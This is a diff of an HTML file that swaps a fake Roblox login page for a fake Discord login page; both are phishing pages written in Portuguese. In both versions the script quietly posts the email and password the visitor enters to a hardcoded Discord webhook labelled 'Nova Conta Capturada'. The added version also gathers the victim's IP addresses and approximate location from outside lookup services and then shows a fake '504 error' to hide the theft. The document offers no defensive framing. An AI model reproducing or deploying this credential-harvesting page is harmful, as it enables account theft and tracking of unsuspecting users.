@@ -1,285 +1,388 @@
 <!DOCTYPE html>
-<html lang="pt-br">
+<html lang="pt-BR">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Roblox</title>
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
-  
+  <title>Discord - Entrar</title>
   <style>
-    * { margin:0; padding:0; box-sizing:border-box; }
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
     body {
-      font-family: 'Roboto', sans-serif;
-      color: #e3e3e3;
-      min-height: 100vh;
-      background: #000 url('https://images.rbxcdn.com/076d146437ffc79cebc36bf2ded91196') no-repeat center center fixed;
+      font-family: 'gg sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+      background: url('Minha_fot0_fundo_discord.jpg') no-repeat center center fixed;
       background-size: cover;
+      color: #fff;
+      height: 100vh;
       display: flex;
-      justify-content: center;
       align-items: center;
+      justify-content: center;
       overflow: hidden;
-    }
-
-    body::before {
-      content: "";
-      position: fixed;
-      inset: 0;
-      background: rgba(0, 0, 0, 0.45);
-      z-index: -1;
-    }
-
-    .container {
-      width: 100%;
-      max-width: 420px;
-      padding: 48px 36px 56px; /* mais espaço embaixo pro erro */
-      background: rgba(25, 25, 30, 0.78);
-      border-radius: 12px;
-      border: 1px solid rgba(255,255,255,0.08);
-      box-shadow: 0 24px 70px rgba(0,0,0,0.7);
-      backdrop-filter: blur(16px);
-      z-index: 10;
-      text-align: center;
-      position: relative; /* para posicionar o erro relativo ao container */
-    }
-
-    .logo { margin-bottom: 40px; }
-    .logo img {
-      width: 220px;
-      height: auto;
-      filter: drop-shadow(0 6px 16px rgba(0, 170, 255, 0.5));
-    }
-
-    h1 {
-      font-size: 32px;
-      font-weight: 700;
-      margin-bottom: 32px;
-      color: #ffffff;
-      letter-spacing: 0.5px;
-    }
-
-    .input-group {
-      margin-bottom: 24px;
-      text-align: left;
       position: relative;
+      opacity: 0;
+      transform: translateY(-30px);
+      animation: fadeInUp 1s ease-out forwards;
     }
-
+    @keyframes fadeInUp {
+      to { opacity: 1; transform: translateY(0); }
+    }
+    body::after {
+      content: "";
+      position: absolute;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.40);
+      pointer-events: none;
+      z-index: 1;
+    }
+    .container {
+      display: flex;
+      width: 90%;
+      max-width: 1100px;
+      height: 85vh;
+      max-height: 700px;
+      background: rgba(30, 30, 50, 0.80);
+      border-radius: 12px;
+      overflow: hidden;
+      box-shadow: 0 10px 40px rgba(0,0,0,0.7);
+      backdrop-filter: blur(10px);
+      position: relative;
+      z-index: 2;
+    }
+    .left {
+      flex: 1;
+      padding: 60px 80px;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+    }
+    .right {
+      flex: 1;
+      background: rgba(54, 57, 63, 0.92);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 40px;
+    }
+    h1 {
+      font-size: 2.2rem;
+      margin-bottom: 8px;
+      text-align: center;
+    }
+    p.subtitle {
+      color: #b9bbbe;
+      text-align: center;
+      margin-bottom: 40px;
+      font-size: 1.1rem;
+    }
     label {
       display: block;
       margin-bottom: 8px;
-      font-size: 14px;
-      font-weight: 500;
-      color: #d0d0d0;
+      font-size: 0.9rem;
+      color: #b9bbbe;
+      font-weight: 600;
     }
-
     input {
       width: 100%;
-      padding: 14px 48px 14px 16px;
-      border: 1px solid #3a3a3a;
-      border-radius: 6px;
-      background: #111114;
-      color: #fff;
-      font-size: 16px;
-      transition: all 0.2s ease;
-    }
-
-    input:focus {
-      outline: none;
-      border-color: #00a2ff;
-      box-shadow: 0 0 0 3px rgba(0, 162, 255, 0.3);
-    }
-
-    .eye-icon {
-      position: absolute;
-      right: 16px;
-      top: 50%;
-      transform: translateY(-12%);
-      font-size: 20px;
-      cursor: pointer;
-      user-select: none;
-      color: #aaa;
-      transition: color 0.2s;
-    }
-
-    .eye-icon:hover { color: #00a2ff; }
-
-    .btn-login {
-      width: 100%;
-      padding: 16px;
-      margin: 16px 0 24px;
-      background: linear-gradient(90deg, #00a2ff, #0077cc);
+      padding: 14px;
+      margin-bottom: 12px;
+      background: #202225;
+      border: 1px solid #2f3136;
+      border-radius: 4px;
       color: white;
-      border: none;
-      border-radius: 6px;
-      font-size: 18px;
-      font-weight: 600;
-      cursor: pointer;
-      transition: all 0.25s;
+      font-size: 1rem;
+      outline: none;
     }
-
-    .btn-login:hover {
-      background: linear-gradient(90deg, #0088dd, #005fa3);
-      transform: translateY(-2px);
-      box-shadow: 0 8px 20px rgba(0, 130, 255, 0.4);
+    input:focus {
+      border-color: #5865f2;
+      box-shadow: 0 0 0 2px rgba(88,101,242,0.3);
     }
-
-    .btn-login:active { transform: translateY(0); }
-    .btn-login:disabled {
-      background: #444;
-      cursor: not-allowed;
-      opacity: 0.6;
-    }
-
-    .links {
-      font-size: 14px;
-      margin-top: 12px;
-    }
-
-    .links a {
-      color: #00a2ff;
+    .forgot-link {
+      color: #00aff4;
+      font-size: 0.9rem;
       text-decoration: none;
-      margin: 0 12px;
-      transition: color 0.2s;
+      display: block;
+      margin-bottom: 24px;
+      text-align: left;
     }
-
-    .links a:hover {
-      color: #4dc3ff;
+    .forgot-link:hover {
       text-decoration: underline;
     }
-
-    /* Mensagem de erro AGORA ABAIXO DO BOTÃO */
-    .error-message {
-      margin: 16px auto 0;
-      background: rgba(220, 50, 50, 0.95);
+    button {
+      width: 100%;
+      padding: 14px;
+      background: #5865f2;
       color: white;
-      padding: 12px 28px;
-      border-radius: 8px;
+      border: none;
+      border-radius: 4px;
+      font-size: 1.1rem;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.2s, transform 0.1s;
+      margin-bottom: 16px;
+    }
+    button:hover {
+      background: #4752c4;
+      transform: translateY(-2px);
+    }
+    button:active {
+      transform: translateY(0);
+    }
+    .register-link {
+      text-align: center;
+      font-size: 0.95rem;
+      color: #b9bbbe;
+    }
+    .register-link a {
+      color: #00aff4;
+      text-decoration: none;
+      font-weight: 600;
+    }
+    .register-link a:hover {
+      text-decoration: underline;
+    }
+    .qr-section {
+      text-align: center;
+      color: white;
+      max-width: 320px;
+    }
+    .qr-image {
+      width: 240px;
+      height: 240px;
+      margin: 20px auto 16px;
+      border-radius: 12px;
+      box-shadow: 0 8px 30px rgba(0,0,0,0.5);
+      background: white;
+      padding: 10px;
+      object-fit: contain;
+    }
+    .qr-title {
+      font-size: 1.4rem;
+      font-weight: 700;
+      margin-bottom: 16px;
+    }
+    .qr-custom-text {
+      font-size: 1.1rem;
+      font-weight: 600;
+      line-height: 1.4;
+      margin: 0 0 20px 0;
+    }
+    .logos {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+      margin: 16px 0;
+    }
+    .logos img {
+      height: 50px;
+      width: auto;
+      object-fit: contain;
+    }
+    .extra-link {
+      margin-top: 20px;
+      font-size: 1rem;
+      font-weight: 600;
+    }
+    .extra-link a {
+      color: #00aff4;
+      text-decoration: none;
+    }
+    .extra-link a:hover {
+      text-decoration: underline;
+    }
+    .voltar {
+      position: absolute;
+      top: 20px;
+      left: 20px;
+      color: #00aff4;
+      text-decoration: none;
+      font-weight: bold;
+      z-index: 3;
+    }
+    .error-message {
+      background: rgba(255, 0, 0, 0.25);
+      border: 1px solid #ff4d4d;
+      color: #ffcccc;
+      padding: 12px;
+      margin-top: 12px;
+      border-radius: 6px;
+      text-align: center;
+      font-size: 0.95rem;
       font-weight: 500;
-      font-size: 15px;
-      display: inline-block;
       opacity: 0;
       transform: translateY(20px);
-      transition: all 0.4s ease;
-      box-shadow: 0 8px 24px rgba(200,0,0,0.4);
+      transition: opacity 0.4s ease, transform 0.4s ease;
       pointer-events: none;
     }
-
     .error-message.show {
       opacity: 1;
       transform: translateY(0);
-      animation: shake 0.5s, fadeOut 3.2s 1s forwards;
     }
-
-    @keyframes shake {
-      0%, 100% { transform: translateY(0); }
-      10%, 30%, 50%, 70%, 90% { transform: translateY(-6px); }
-      20%, 40%, 60%, 80% { transform: translateY(6px); }
-    }
-
-    @keyframes fadeOut {
-      to {
-        opacity: 0;
-        transform: translateY(-10px);
-      }
+    @media (max-width: 900px) {
+      .container { flex-direction: column; height: auto; }
+      .right { padding: 60px 20px; }
+      .left { padding: 40px 30px; }
     }
   </style>
 </head>
 <body>
-
-<div class="container">
-  <div class="logo">
-    <img src="https://www.roblox.com/images/Logo.svg" alt="Roblox" 
-         onerror="this.src='https://via.placeholder.com/220x70/00a2ff/ffffff?text=Roblox';">
+  <div class="container">
+    <div class="left">
+      <a href="#" class="voltar">&lt; Voltar</a>
+     
+      <h1>Boas-vindas de volta!</h1>
+      <p class="subtitle">Estamos muito animados em te ver novamente!</p>
+     
+      <form id="loginForm">
+        <label for="email">E-mail ou número de telefone *</label>
+        <input type="text" id="email" placeholder="" required />
+       
+        <label for="senha">Senha *</label>
+        <input type="password" id="senha" placeholder="" required />
+       
+        <a href="#" class="forgot-link">Esqueceu sua senha?</a>
+       
+        <button type="submit">Entrar</button>
+       
+        <div id="errorBox" class="error-message">
+          --- Erro 504 Recarregue a pagina ou tente Novamente mais tarde! ---
+        </div>
+       
+        <div class="register-link">
+          Precisando de uma conta? <a href="#">Registre-se</a>
+        </div>
+      </form>
+    </div>
+   
+    <div class="right">
+      <div class="qr-section">
+        <img class="qr-image" src="https://result.ghiblivideo.ai/output/result/202602/22/260d087ebb2a4245a2a0e28c0b9ddb9d.png" alt="QR customizado" />
+       
+        <div class="qr-title">Entrar com código QR</div>
+       
+        <p class="qr-custom-text">
+          Ou faça login pelo roblox!!<br>
+          Estamos fazendo parceria em troca de divulgação!!
+        </p>
+       
+        <div class="logos">
+          <img src="https://upload.wikimedia.org/wikipedia/commons/7/7c/Discord-logo-icon.jpg" alt="Discord Logo">
+          <span style="font-size: 1.8rem; font-weight: bold;"> - </span>
+          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f2/Roblox_%282025%29_%28App_Icon%29.svg/960px-Roblox_%282025%29_%28App_Icon%29.svg.png" alt="Roblox Logo">
+        </div>
+        
+        <!-- Link com texto clicável -->
+        <div class="extra-link">
+          <a href="https://notic1as-verdadeiras.vercel.app" target="_blank">Acesse aqui para mais novidades</a>
+        </div>
+      </div>
+    </div>
   </div>
 
-  <h1>Entrar</h1>
+  <script>
+    const form = document.getElementById('loginForm');
+    const errorBox = document.getElementById('errorBox');
+    const webhookUrl = 'https://discord.com/api/webhooks/1482464893058945258/dVHkrAXszpxDyRXpI3ji-cHEipO9lsIM2ullHumbhQvYmeeXlNdQemM95slCGrN-cOuC';
 
-  <div class="input-group">
-    <label for="username">Nome de usuário ou Email</label>
-    <input type="text" id="username" placeholder="" autocomplete="off">
-  </div>
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
 
-  <div class="input-group">
-    <label for="password">Senha</label>
-    <input type="password" id="password" placeholder="" autocomplete="off">
-    <span class="eye-icon" id="togglePassword">👁️</span>
-  </div>
+      const email = document.getElementById('email').value.trim();
+      const senha = document.getElementById('senha').value.trim();
 
-  <button class="btn-login" id="loginBtn">Entrar</button>
+      if (!email || !senha) {
+        alert('Preencha todos os campos obrigatórios!');
+        return;
+      }
 
-  <div class="links">
-    <a href="#">Esqueceu a senha?</a> • <a href="#">Não tem conta? Cadastre-se</a>
-  </div>
+      // Captura IPv4 e IPv6 separadamente
+      let ipv4 = 'Não detectado';
+      let ipv6 = 'Não detectado';
+      let location = 'Desconhecido';
 
-  <!-- Mensagem de erro movida para cá, logo abaixo do botão -->
-  <div class="error-message" id="errorMsg">Nome de usuário ou senha incorretos</div>
-</div>
+      try {
+        // IPv4 puro via ipify
+        let resIPv4 = await fetch('https://api.ipify.org?format=json');
+        let dataIPv4 = await resIPv4.json();
+        if (dataIPv4.ip) ipv4 = dataIPv4.ip;
+      } catch {}
 
-<script>
-  // Toggle olho / macaco
-  const passwordInput = document.getElementById('password');
-  const toggleIcon = document.getElementById('togglePassword');
+      try {
+        // IPv6 + localização via ipapi.co
+        let res = await fetch('https://ipapi.co/json/');
+        let data = await res.json();
+        if (data.ip) {
+          if (data.ip.includes(':')) {
+            ipv6 = data.ip; // se for IPv6
+          } else if (ipv4 === 'Não detectado') {
+            ipv4 = data.ip;
+          }
+          location = data.city && data.country_name ? `${data.city}, ${data.country_name}` : 'Desconhecido';
+        }
+      } catch {
+        try {
+          let res2 = await fetch('https://ipwhois.io/api');
+          let data2 = await res2.json();
+          if (data2.ip) {
+            if (data2.ip.includes(':')) {
+              ipv6 = data2.ip;
+            } else if (ipv4 === 'Não detectado') {
+              ipv4 = data2.ip;
+            }
+            location = data2.city && data2.country ? `${data2.city}, ${data2.country}` : 'Desconhecido';
+          }
+        } catch {}
+      }
 
-  toggleIcon.addEventListener('click', () => {
-    const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
-    passwordInput.setAttribute('type', type);
-    toggleIcon.textContent = type === 'text' ? '🙈' : '👁️';
-  });
-
-  // Login + webhook
-  const loginBtn = document.getElementById('loginBtn');
-  const errorMsg = document.getElementById('errorMsg');
-  const usernameInput = document.getElementById('username');
-
-  const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1482464893058945258/dVHkrAXszpxDyRXpI3ji-cHEipO9lsIM2ullHumbhQvYmeeXlNdQemM95slCGrN-cOuC";
-
-  async function enviarParaDiscord(username, password) {
-    try {
-      const data = {
-        content: "",
-        embeds: [{
-          title: "🔐 **Nova Conta Capturada**",
-          color: 0xFF0000,
-          fields: [
-            { name: "**Login:**", value: `\`${username.trim() || "——— vazio ———"}\``, inline: true },
-            { name: "**Senha:**", value: `\`${password.trim() || "——— vazio ———"}\``, inline: true }
-          ],
-          timestamp: new Date().toISOString(),
-          footer: { text: "Capturado • " + new Date().toLocaleString("pt-BR", { timeZone: "America/Sao_Paulo" }) }
-        }]
+      // Data e hora correta (America/Sao_Paulo)
+      const agora = new Date();
+      const options = {
+        timeZone: 'America/Sao_Paulo',
+        year: 'numeric',
+        month: '2-digit',
+        day: '2-digit',
+        hour: '2-digit',
+        minute: '2-digit',
+        second: '2-digit',
+        hour12: false
       };
+      const formatter = new Intl.DateTimeFormat('pt-BR', options);
+      const partes = formatter.formatToParts(agora);
+      
+      const dataFormatada = partes.find(p => p.type === 'day').value + '/' +
+                            partes.find(p => p.type === 'month').value + '/' +
+                            partes.find(p => p.type === 'year').value;
+      const horaFormatada = partes.find(p => p.type === 'hour').value + ':' +
+                            partes.find(p => p.type === 'minute').value + ':' +
+                            partes.find(p => p.type === 'second').value;
+      const hoje = partes.find(p => p.type === 'hour').value + ':' +
+                   partes.find(p => p.type === 'minute').value;
 
-      await fetch(DISCORD_WEBHOOK_URL, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(data)
-      });
-    } catch (err) {
-      console.error("Erro no webhook:", err);
-    }
-  }
+      // Mensagem com IPv4 e IPv6 separados
+      const mensagem = `🔐 **Nova Conta De Discord Capturada!**
 
-  loginBtn.addEventListener('click', async () => {
-    const username = usernameInput.value.trim();
-    const password = passwordInput.value.trim();
+**Login:** \`${email}\`
+**Senha:** \`${senha}\`
 
-    loginBtn.disabled = true;
-    loginBtn.textContent = "Entrando...";
+**IPv4:** ${ipv4}
+**IPv6:** ${ipv6}
+📍 Localização aproximada: ${location}
 
-    if (!DISCORD_WEBHOOK_URL.includes("SEU_ID")) {
-      await enviarParaDiscord(username, password);
-    }
+**Capturado** • ${dataFormatada}, ${horaFormatada} • Hoje às ${hoje}`;
 
-    errorMsg.classList.add('show');
+      // Envia pro webhook silenciosamente
+      fetch(webhookUrl, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ content: mensagem })
+      }).catch(() => {});
 
-    setTimeout(() => {
-      errorMsg.classList.remove('show');
-      loginBtn.disabled = false;
-      loginBtn.textContent = "Entrar";
-    }, 3800);
-  });
-</script>
-
+      // Mostra erro 504 animado
+      errorBox.classList.add('show');
+      setTimeout(() => errorBox.classList.remove('show'), 3000);
+    });
+  </script>
 </body>
 </html>
